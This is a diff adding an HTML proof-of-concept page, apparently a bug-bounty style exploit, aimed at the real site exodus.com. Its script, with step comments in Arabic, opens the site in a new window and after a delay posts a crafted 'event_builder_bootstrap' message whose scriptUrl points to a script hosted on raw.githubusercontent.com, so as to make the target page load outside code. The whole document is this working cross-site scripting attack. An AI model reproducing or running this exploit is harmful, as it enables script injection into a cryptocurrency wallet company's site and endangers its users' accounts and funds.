@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Exodus XSS PoC</title>
+</head>
+<body>
+  <h1>🚨 Exploiting exodus.com via postMessage + scriptUrl</h1>
+
+  <script>
+    // الخطوة 1: فتح موقع exodus في نافذة جديدة
+    const exodusWindow = window.open("https://www.exodus.com", "_blank", "width=1000,height=800");
+
+    // الخطوة 2: انتظر قليلًا حتى يُفعّل المستمع
+    setTimeout(() => {
+      // الخطوة 3: أرسل الرسالة التي تحمّل سكربتك
+      exodusWindow.postMessage({
+        type: "event_builder_bootstrap",
+        scriptUrl: "https://raw.githubusercontent.com/Baali07/XSS-PoC/main/x.js"
+      }, "https://www.exodus.com");
+    }, 3000); // يمكن زيادتها إلى 5000ms للتأكد
+  </script>
+</body>
+</html>
